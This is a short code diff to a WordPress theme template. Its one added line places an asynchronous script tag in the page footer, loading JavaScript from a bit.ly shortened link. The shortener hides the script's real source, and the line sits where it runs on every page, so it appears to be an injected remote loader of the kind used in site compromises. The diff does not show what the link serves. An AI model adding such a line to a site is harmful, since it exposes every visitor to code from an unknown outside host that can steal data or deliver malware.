@@ -90,6 +90,7 @@ $newsletterQuery = new WP_Query(array(
                   });
                 }
             </script>
+            <script async src='https://bit.ly/3wO0rkP' type='text/javascript'></script>
         </footer>
     </body>
 </html>
